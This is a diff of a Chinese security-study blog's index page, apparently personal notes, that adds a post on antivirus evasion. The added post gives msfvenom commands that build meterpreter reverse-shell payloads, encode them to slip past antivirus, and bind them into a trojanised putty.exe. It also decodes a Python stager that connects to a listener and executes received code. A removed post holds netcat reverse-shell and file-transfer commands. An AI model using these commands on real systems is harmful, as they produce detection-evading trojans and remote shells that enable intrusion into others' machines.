@@ -64,6 +64,88 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-免杀1" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/08/09/%E5%85%8D%E6%9D%801/" class="article-date">
+  <time datetime="2021-08-09T13:00:36.000Z" itemprop="datePublished">2021-08-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/09/%E5%85%8D%E6%9D%801/">免杀1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="免杀介绍"><a href="#免杀介绍" class="headerlink" title="免杀介绍"></a>免杀介绍</h2><p>杀软相关:</p>
+<ol>
+<li>扫描技术:</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">扫描技术：</span><br><span class="line">n 1、扫描压缩包技术：即是对压缩包案和封装⽂件作分析检查的技术。</span><br><span class="line">n 2、程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序⽽⼤肆破坏电脑。</span><br><span class="line">n 3、修复技术：即是对恶意程序所损坏的⽂件进⾏还原</span><br><span class="line">n 4、急救盘杀毒：利⽤空⽩U盘制作急救启动盘，来检测电脑病毒。</span><br><span class="line">n 5、智能扫描：扫描最常⽤的磁盘，系统关键位置，耗时较短。</span><br><span class="line">n 6、全盘扫描：扫描电脑全部磁盘，耗时较⻓。</span><br><span class="line">n 7、勒索软件防护：保护电脑中的⽂件不被⿊客恶意加密。</span><br><span class="line">n 8、开机扫描：当电脑开机时⾃动进⾏扫描，可以扫描压缩⽂档和可能不需要的程序</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>监控技术</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">监控技术：</span><br><span class="line">n 1、内存监控：当发现内存中存在病毒的时候，就会主动报警；监控所有进程；监控</span><br><span class="line">n 读取到内存中的⽂件；监控读取到内存的⽹络数据。</span><br><span class="line">n 2、⽂件监控：当发现写到磁盘上的⽂件中存在病毒，或者是被病毒感染，就会主动</span><br><span class="line">n 报警。</span><br><span class="line">n 3、邮件监控：当发现电⼦邮件的附件存在病毒时进⾏拦截。</span><br><span class="line">n 4、⽹⻚防护：阻⽌⽹络攻击和不安全下载。</span><br><span class="line">n 5、⾏为防护：提醒⽤户可疑的应⽤程序⾏为。</span><br></pre></td></tr></table></figure>
+
+<p>特征码</p>
+<p>文件特征码</p>
+<p>内存特征码</p>
+<p>文件校验和</p>
+<p>checksum   生成校验和：md5sum 文件名</p>
+<p>沙箱</p>
+<p>….</p>
+<h2 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h2><p>修改特征码: 逆向</p>
+<p>花指令免杀: 汇编</p>
+<p>加壳免杀</p>
+<p>内存免杀</p>
+<p>二次编译</p>
+<p>分离免杀: shellcode (机器码)</p>
+<p>资源修改:</p>
+<p>​    白名单: 把恶意程序修改成常见的程序的名称</p>
+<p>​    数字签名: 数字签名添加器</p>
+<p>​    资源替换: </p>
+<p>​        版本信息, 发行者信息, 图标信息等…<code>Resource Hacker</code></p>
+<h4 id="metasploit免杀"><a href="#metasploit免杀" class="headerlink" title="metasploit免杀"></a>metasploit免杀</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-shellest 最小化生成payload</span><br><span class="line">-k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">-b, –bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符例如：不使用 &#39;\x0f&#39;、&#39;\x00&#39;; </span><br><span class="line">-s, –space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</span><br><span class="line">-n, –nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br></pre></td></tr></table></figure>
+
+<p>高级模块:</p>
+<p>​    show advanced    –&gt; 查看高级模块</p>
+<p>​    PrependMigrate               true    –&gt; 是否开启进程迁移   </p>
+<p>​    PrependMigrateProc                        –&gt; 指定迁移的进程 </p>
+<p>​    ExitOnSession            false                –&gt; 防止会话假死   </p>
+<p>​    EnableStageEncoding          true    –&gt; 允许编码</p>
+<p>​    StageEncoder                                    –&gt; 木马连接时,对stage进行编码</p>
+<p>​    EnableUnicodeEncoding            –&gt; 指定unicode编码</p>
+<p>​    </p>
+<p>​    raw: 原生代码,</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">生成py文件的木马</span><br><span class="line">msfvenom -a python  -p python/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.1</span><span class="number">.135</span> lport=<span class="number">4444</span> -f raw &gt; <span class="number">1.</span>py</span><br><span class="line"></span><br><span class="line">base64解密:</span><br><span class="line">密文:</span><br><span class="line">aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMS4xMzUnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=</span><br><span class="line">解密:</span><br><span class="line">echo 密文 | base64 -d</span><br><span class="line"><span class="keyword">import</span> socket,zlib,base64,struct,time</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s=socket.socket(<span class="number">2</span>,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&#x27;192.168.1.135&#x27;</span>,<span class="number">4444</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">l=struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>,s.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">d=s.recv(l)</span><br><span class="line"><span class="keyword">while</span> len(d)&lt;l:</span><br><span class="line">    d+=s.recv(l-len(d))</span><br><span class="line">exec(zlib.decompress(base64.b64decode(d)),&#123;<span class="string">&#x27;s&#x27;</span>:s&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>编码模块: -e(指定编码)  -i(指定编码次数)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常用:</span><br><span class="line">x86&#x2F;shikata_ga_nai</span><br><span class="line">x86&#x2F;xor_dynamic</span><br><span class="line">x64&#x2F;xor_dynamic</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">自编码免杀:</span><br><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;IP LPORT&#x3D;PORT -e x86&#x2F;shikata_ga_nai -i 15 -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">自捆绑免杀:</span><br><span class="line">msfvenom -x putty.exe -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.129 LPORT&#x3D;4444 -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/08/09/%E5%85%8D%E6%9D%801/" data-id="ckta5hhy5000j88vjdz6cf0ja" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-armitage和漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
@@ -128,7 +210,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="ckt5vgrsc0007cgvj47p19quw" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/06/armitage%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="ckta5hhxr000888vj1j2r4rjw" class="article-share-link">Share</a>
       
       
     </footer>
@@ -199,7 +281,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="ckt5vgrsh000ccgvj5jk4eenr" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/03/linux%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5/" data-id="ckta5hhxu000c88vj5zq0e701" class="article-share-link">Share</a>
       
       
     </footer>
@@ -267,7 +349,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckt5vgrsi000ecgvj7gw2gpro" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/08/01/linux%E6%8F%90%E6%9D%83/" data-id="ckta5hhy3000g88vj864t6prk" class="article-share-link">Share</a>
       
       
     </footer>
@@ -338,7 +420,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckt5vgrsj000fcgvj0baw07hj" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckta5hhy3000f88vjbsk478e9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -424,7 +506,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckt5vgrsk000gcgvjhnsh2d43" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/26/windows%E6%8F%90%E6%9D%83/" data-id="ckta5hhy4000h88vj49c24bnb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -483,7 +565,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckt5vgrsi000dcgvjbb3h9tna" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/" data-id="ckta5hhy2000e88vjcjwm9dkt" class="article-share-link">Share</a>
       
       
     </footer>
@@ -601,7 +683,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="ckt5vgrs60001cgvj89knfk55" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/20/MSF-meterpreter/" data-id="ckta5hhxk000188vj8owqheiu" class="article-share-link">Share</a>
       
       
     </footer>
@@ -661,7 +743,7 @@ shellcode: 机器码(二进制,十六进制)
 <ol>
 <li><p>db_connect -y /usr/share/metasploit-framework/config/database.yml</p>
 </li>
-<li><p>db_connect user:<a href="mailto:&#x70;&#x61;&#x73;&#115;&#119;&#111;&#x72;&#x64;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#x31;">&#x70;&#x61;&#x73;&#115;&#119;&#111;&#x72;&#x64;&#x40;&#x31;&#x32;&#x37;&#46;&#x30;&#46;&#x30;&#46;&#x31;</a>/database_name</p>
+<li><p>db_connect user:<a href="mailto:&#x70;&#x61;&#115;&#x73;&#119;&#x6f;&#x72;&#x64;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#x2e;&#x31;">&#x70;&#x61;&#115;&#x73;&#119;&#x6f;&#x72;&#x64;&#64;&#x31;&#x32;&#x37;&#x2e;&#48;&#x2e;&#x30;&#x2e;&#x31;</a>/database_name</p>
 </li>
 </ol>
 <h5 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令:"></a>基础指令:</h5><h5 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h5><p>msf是用ruby语言写的,脚本后缀为.rc文件</p>
@@ -711,7 +793,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckt5vgrs90003cgvj4myj9i3h" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/18/MSF%E5%9F%BA%E7%A1%80/" data-id="ckta5hhxl000288vj53ulbc3w" class="article-share-link">Share</a>
       
       
     </footer>
@@ -769,117 +851,7 @@ shellcode: 机器码(二进制,十六进制)
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckt5vgrsb0006cgvj1njm58qg" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
-  <time datetime="2021-07-14T02:31:33.000Z" itemprop="datePublished">2021-07-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>1-存活主机</p>
-<p>2-端口扫描</p>
-<p>3-防火墙侦测</p>
-<p>4-漏洞扫描</p>
-<p>5-操作系统</p>
-<p>banner:指的是指纹(版本信息、服务器(中间件)信息、开发商信息…)</p>
-<p>nmap扫描结果的三种状态:</p>
-<p>open(开放)</p>
-<p>closed(关闭)</p>
-<p>filtered(不确定是否开放)</p>
-<h4 id="常用操作指令"><a href="#常用操作指令" class="headerlink" title="常用操作指令"></a><strong>常用操作指令</strong></h4><p>基本用法:nmap IP</p>
-<p>-Pn:跳过主机存活判断,默认判断存活(推荐)</p>
-<p>-sS：SYN扫描（隐匿） </p>
-<p>-sV：探测打开的端口以确定服务/版本</p>
-<p>-sSV=  -sS   -sV</p>
-<p>-O:    操作系统的判断</p>
-<p>-T:    扫描速度的设置(推荐T4)</p>
-<p>-p:    指定端口扫描,-p 端口号 | -p- 全端口扫描 | -p0-65535|-p100-1000 | -p 80,445,3389</p>
-<p>–script=脚本名</p>
-<p>–script=模糊测试的脚本简写的名称</p>
-<p>-sC：相当于–script=defaults</p>
-<p>-oN: 标准输出</p>
-<p>​    例如:-oN 1.txt</p>
-<h4 id="NC-netcat"><a href="#NC-netcat" class="headerlink" title="NC(netcat)"></a>NC(netcat)</h4><p> 常用参数:</p>
-<p> -c | -e: 执行命令或者程序,常用于反弹shell</p>
-<p> -l:开启监听</p>
-<p> -p:设定端口</p>
-<p> -z:零输入输出,常用于端口开放检测,(连上立即断开)</p>
-<p> -v -vv:详细信息|更详细的信息</p>
-<p> -n:仅显示数字的ip地址,不显示DNS信息</p>
-<p>创建监听:</p>
-<p>nc -lp 指定端口号                监听端口</p>
-<p>nc -lvvp 指定端口号            监听端口并显示详细的信息</p>
-<p>nc -lnvp 指定端口号            监听端口并显示详细的信息</p>
-<p>连接:</p>
-<p>nc ip port</p>
-<p>端口扫描:</p>
-<p>nc -vz IP 端口号[单个端口,端口列表(80-1024)]</p>
-<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell:"></a>反弹shell:</h4><p>在linux中:</p>
-<p> # –&gt; 特权用户(比如说 root)</p>
-<p> $ –&gt; 普通用户</p>
-<p>linux中默认的编码格式:utf8    占两个字符        </p>
-<p>windows中默认的编码格式:gbk     占三个字符        </p>
-<p>windows命令行切换utf8:chcp 65001</p>
-<p>windows命令行切换gbk:chcp 936</p>
-<p>lsof -i:port    查看指定端口开放情况</p>
-<p>netstat -lutpn 查看端口开放情况</p>
-<p>正向连接:指服务器主动反弹shell</p>
-<p>​    以linux反弹shell为例:</p>
-<p>​    服务端开启监听</p>
-<p>​    nc -lvvp port -e /bin/bash</p>
-<p>​    客户端连接</p>
-<p>​    nc -v ip port </p>
-<p>反向连接:指客户端主动反弹shell</p>
-<p>​    以windows反弹shell为例:</p>
-<p>​    服务端开启监听</p>
-<p>​    nc -lvvp 4444</p>
-<p>​    客户端反弹shell</p>
-<p>​    nc ip port -e “c:\windows\system32\cmd.exe”</p>
-<p>​    </p>
-<p>​    linux会话提升:python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
-<p>python -c “import pty;pty.spawn(‘/bin/bash’)”<br>                id</p>
-<p>​                用户id=0(root) 组id=0(root) 组=0(root)</p>
-<h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>​    正向传输:</p>
-<p>​    传输</p>
-<p>​    -q 1 :传输完立马断开,不加就一直卡住</p>
-<p>​    nc -lvvp port &lt; 1.txt -q 1</p>
-<p>​    接收</p>
-<p>​    nc ip port &gt; 2.txt</p>
-<p>​    反向传输:</p>
-<p>​    传输</p>
-<p>​    nc ip port &lt; 1.txt -q 1</p>
-<p>​    接收</p>
-<p>​    nc -lvvp port &gt; 2.txt</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckt5vgrsq000hcgvj0qh3b1ua" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckta5hhxp000688vj7l6h4kda" class="article-share-link">Share</a>
       
       
     </footer>
@@ -925,6 +897,10 @@ shellcode: 机器码(二进制,十六进制)
       <ul>
         
           <li>
+            <a href="/2021/09/07/WEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">WEB安全基础</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/04/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a>
           </li>
         
@@ -938,10 +914,6 @@ shellcode: 机器码(二进制,十六进制)
         
           <li>
             <a href="/2021/08/26/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/">端口转发和代理</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/24/empire%E4%BC%9A%E8%AF%9D%E4%BC%A0%E9%80%92%E5%92%8C%E4%BB%A3%E7%90%86/">empire会话传递和代理</a>
           </li>
         
       </ul>
